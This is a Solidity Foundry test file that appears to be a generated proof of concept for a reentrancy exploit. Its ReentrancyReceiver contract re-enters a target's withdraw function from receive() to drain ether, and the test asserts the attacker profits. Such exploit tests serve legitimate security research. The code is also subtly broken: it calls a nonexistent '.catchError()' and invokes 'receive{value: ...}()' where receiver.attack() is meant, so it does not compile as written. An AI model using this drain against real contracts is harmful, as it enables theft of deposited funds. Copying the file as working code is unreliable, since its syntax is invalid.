// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/62ce34ec-b052-4104-990f-02b196829969_Mixed.sol";

contract ReentrancyReceiver {
    MixedTest private immutable target;
    uint256 private immutable amount;

    constructor(MixedTest target_) {
        target = target_;
        amount = 1 ether;
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            bool success = target.withdraw(amount).catchError();
            require(success, "Withdraw failed");
        }
    }

    function attack() external payable {
        require(msg.value == amount, "incorrect seed");
        target.deposit{value: amount}();
        target.withdraw(amount);
    }
}

contract PocTest is BaseTestWithBalanceLog {
    MixedTest target;
    ReentrancyReceiver receiver;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new MixedTest();
        receiver = new ReentrancyReceiver(target);
        vm.deal(attacker, 10 ether);
        vm.deal(address(target), 10 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        receive{value: 1 ether}();
        assertGt(address(receiver).balance, 1 ether);
    }
}